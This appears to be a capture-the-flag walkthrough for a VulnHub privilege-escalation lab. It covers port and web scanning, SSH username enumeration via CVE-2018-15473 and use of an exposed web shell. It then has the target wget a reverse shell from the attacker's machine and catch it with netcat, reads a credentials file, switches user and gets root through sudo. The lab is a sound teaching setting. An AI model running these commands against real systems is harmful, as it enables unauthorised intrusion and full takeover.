@@ -1,0 +1,248 @@
+Hello Friends,
+
+Today we will try to root the challenge "Elevate My Privilege" you can download the lab from "https://www.vulnhub.com/entry/escalate-my-privileges-1,448".
+
+Let's Start.
+
+Lab Started (IP) : 192.168.1.79
+Kali Linux (IP) : 192.168.1.73
+
+We started the Open Port Scan:
+┌──(root㉿kali)-[~]
+└─# nmap -p- -T4 192.168.1.79
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-18 13:50 EST
+Nmap scan report for 192.168.1.79
+Host is up (0.00062s latency).
+Not shown: 65387 filtered tcp ports (no-response), 139 filtered tcp ports (host-prohibited)
+PORT      STATE  SERVICE
+22/tcp    open   ssh
+80/tcp    open   http
+111/tcp   open   rpcbind
+875/tcp   closed unknown
+2049/tcp  open   nfs
+20048/tcp open   mountd
+42955/tcp closed unknown
+46666/tcp closed unknown
+54302/tcp closed unknown
+MAC Address: 00:0C:29:EF:CA:67 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 133.36 seconds
+
+Now we need to enumerate the Service Version of the running services on Open Ports:
+
+──(root㉿kali)-[~]
+└─# nmap -p22,80,111,875,2049,20048,42955,46666,54302 -sV 192.168.1.79
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-18 13:53 EST
+Nmap scan report for 192.168.1.79
+Host is up (0.0010s latency).
+
+PORT      STATE  SERVICE VERSION
+22/tcp    open   ssh     OpenSSH 7.4 (protocol 2.0)
+80/tcp    open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+111/tcp   open   rpcbind 2-4 (RPC #100000)
+875/tcp   closed unknown
+2049/tcp  open   nfs_acl 3 (RPC #100227)
+20048/tcp open   mountd  1-3 (RPC #100005)
+42955/tcp closed unknown
+46666/tcp closed unknown
+54302/tcp closed unknown
+MAC Address: 00:0C:29:EF:CA:67 (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.85 seconds
+
+We have checked Public Exploit for "OpenSSH 7.4" and we have found one CVE-2018-15473, you can find the CVE Exploit "https://github.com/epi052/cve-2018-15473"
+
+┌──(root㉿kali)-[~/cve-2018-15473]
+└─# ./ssh-username-enum.py 192.168.1.79 -u pranshu
+[+] OpenSSH version 7.4 found
+[+] pranshu found!
+
+Alternative we can run the exploit against a wordlist:
+
+┌──(root㉿kali)-[~/cve-2018-15473]
+└─# ./ssh-username-enum.py -t 10 -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt 192.168.1.79
+[+] OpenSSH version 7.4 found
+[+] bin found!
+[+] bitnami found!
+[+] administrator found!
+[+] chronos found!
+[+] couchdb found!
+
+
+Now lets move to Port 80 and run the gobuster to enumerate hidden directories:
+
+┌──(root㉿kali)-[~]
+└─# gobuster dir -u http://192.168.1.79/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.1.79/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 211]
+/.htpasswd            (Status: 403) [Size: 211]
+/cgi-bin/             (Status: 403) [Size: 210]
+/robots.txt           (Status: 200) [Size: 37]
+Progress: 20476 / 20477 (100.00%)
+===============================================================
+Finished
+===============================================================
+
+Lets check the robots.txt file:
+
+User-agent: *
+Disallow: /phpbash.php
+
+We can also confirm and check Nikto Scan result:
+┌──(root㉿kali)-[~]
+└─# nikto -h http://192.168.1.79/
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.79
++ Target Hostname:    192.168.1.79
++ Target Port:        80
++ Start Time:         2024-02-18 14:10:32 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.6 (CentOS) PHP/5.4.16
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/5.4.16
++ Entry '/phpbash.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ PHP/5.4.16 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ /phpinfo.php: Output from the phpinfo() function was found.
++ OSVDB-3092: /readme.txt: This might be interesting...
++ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 8725 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2024-02-18 14:11:29 (GMT-5) (57 seconds)
+---------------------------------------------------------------------------
+
+We have one entry, lets check that. This is a reverse shell. We can run commands now. Lets check the current user and its privilege:
+apache@my_privilege
+:/var/www/html# whoami
+apache
+apache@my_privilege
+:/var/www/html# id
+uid=48(apache) gid=48(apache) groups=48(apache)
+
+Now we need to perfrom privilege escalation. There are lot of misconfiguration in this such as:
+1. Weak File Permission
+  /etc/shadow
+  /etc/passwd
+2. We can check for Apache Version exploit. Which in our case is not possible.
+
+To get proper shell in our kali termianl, I have uploaded my shell:
+
+
+apache@my_privilege
+:/var/www/html# wget http://192.168.1.73:8000/reverse_shell.php
+
+--2024-02-18 19:54:15-- http://192.168.1.73:8000/reverse_shell.php
+Connecting to 192.168.1.73:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5493 (5.4K) [application/octet-stream]
+Saving to: 'reverse_shell.php'
+
+0K ..... 100% 4.27M=0.001s
+
+2024-02-18 19:54:15 (4.27 MB/s) - 'reverse_shell.php' saved [5493/5493]
+
+Now once i access the file, i will get the shell in my kali.
+
+┌──(root㉿kali)-[~/Reverse_Shells]
+└─# nc -lnvp 1234                                                     
+listening on [any] 1234 ...
+connect to [192.168.1.73] from (UNKNOWN) [192.168.1.79] 56118
+Linux my_privilege 3.10.0-1062.18.1.el7.x86_64 #1 SMP Tue Mar 17 23:49:17 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 19:55:21 up 42 min,  0 users,  load average: 0.00, 0.04, 0.13
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ 
+
+We have got the credentials.txt file under "/home/user/"
+sh-4.2$ cat Cr
+cat Credentials.txt 
+my password is
+md5(rootroot1)
+
+Let's create MD5 for the user credentials found using command: echo -n rootroot1 | md5sum
+
+┌──(root㉿kali)-[~]
+└─# echo -n rootroot1 | md5sum
+b7bc8489abe360486b4b19dbc242e885
+
+We tried accessing SSH with the given creds but its not working. So we need to try something else. Now we can try running the command "sudo su" or "su armour".
+
+sh-4.2$ su armour
+su armour
+Password: b7bc8489abe360486b4b19dbc242e885
+whoami
+armour
+
+We have got the shell of second user. Lets get a stable shell and try to elevate tty restircted shell.
+
+uid=1000(armour) gid=1000(armour) groups=1000(armour),31(exim)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+[armour@my_privilege ~]$ id    
+id
+uid=1000(armour) gid=1000(armour) groups=1000(armour),31(exim)
+[armour@my_privilege ~]$ 
+
+Its time we need to elevate the privilege lets try "sudo -l" which all command user armour can run as a sudo:
+
+[armour@my_privilege /]$ sudo -l
+sudo -l
+Matching Defaults entries for armour on my_privilege:
+    requiretty, !visiblepw, always_set_home, env_reset, env_keep="COLORS
+    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS", env_keep+="MAIL PS1
+    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL
+    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", env_keep+=LD_PRELOAD,
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User armour may run the following commands on my_privilege:
+    (ALL : ALL) NOPASSWD: /bin/sh, /bin/bash, /usr/bin/sh, /usr/bin/bash,
+        /bin/tcsh, /bin/csh, /bin/ksh, /bin/rksh, /bin/zsh, /usr/bin/fish,
+        /bin/dash, /usr/bin/tmux, /usr/bin/rsh, /bin/rc, /usr/bin/rc,
+        /usr/bin/rssh, /usr/bin/scponly, /bin/scponly, /usr/bin/rootsh,
+        /usr/bin/shc, /usr/bin/shtool, /usr/bin/targetcli, /usr/bin/nano,
+        /usr/bin/rnano, /usr/bin/awk, /usr/bin/dgawk, /usr/bin/gawk,
+        /usr/bin/igawk, /usr/bin/pgawk, /usr/bin/curl, /bin/ed, /bin/red,
+        /usr/bin/env, /usr/bin/cat, /usr/bin/chcon, /usr/bin/chgrp,
+        /usr/bin/chmod, /usr/bin/chown, /usr/bin/cp, /usr/bin/cut, /usr/bin/dd,
+        /usr/bin/head, /usr/bin/ln, /usr/bin/mv, /usr/bin/nice, /usr/bin/tail,
+        /usr/bin/uniq, /usr/bin/ftp, /usr/bin/pftp, /usr/bin/zip,
+        /usr/bin/zipcloak, /usr/bin/zipnote, /usr/bin/zipsplit,
+        /usr/bin/funzip, /usr/bin/unzip, /usr/bin/unzipsfx, /usr/bin/zipgrep,
+        /usr/bin/zipinfo, /usr/bin/7za, /usr/bin/socat, /usr/bin/php,
+        /usr/bin/git, /usr/bin/rvim, /usr/bin/rvim, /usr/bin/vim,
+        /usr/bin/vimdiff, /usr/bin/vimtutor, /usr/bin/vi, /bin/sed,
+        /usr/bin/qalc, /usr/bin/e3, /usr/bin/dex, /usr/bin/elinks,
+        /usr/bin/scp, /usr/bin/sftp, /usr/bin/ssh, /usr/bin/gtar, /usr/bin/tar,
+
+lets try old sudo bash:
+[armour@my_privilege /]$ sudo bash
+sudo bash
+[root@my_privilege /]# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+[root@my_privilege /]# 
+
+
+We have successfully rooted :)
